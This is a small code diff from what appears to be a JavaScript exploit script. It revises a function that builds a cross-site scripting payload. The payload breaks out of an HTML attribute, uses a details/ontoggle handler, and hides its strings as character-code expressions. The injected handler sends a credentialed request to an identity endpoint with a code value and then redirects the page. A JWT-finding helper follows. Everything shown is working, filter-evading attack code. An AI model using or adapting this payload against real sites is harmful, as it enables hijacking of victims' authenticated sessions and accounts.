@@ -55,8 +55,8 @@
     const contentType = charCodeExpression("Content-Type");
     const textPlain = charCodeExpression("text/plain");
     const codeValue = charCodeExpression(code);
-    const handler = `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:JSON.stringify({code:${codeValue}})});top[${timeoutName}](()=>top.location=${returnUrl},1500)`;
-    return `250\"><details open ontoggle='${handler}'>`;
+    const handler = `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:JSON.stringify({code:${codeValue}})});top[${timeoutName}](top.location.replace.bind(top.location,${returnUrl}),1500)`;
+    return `250\"><details open ontoggle=${handler}>`;
   }
 
   function findJwt(value) {
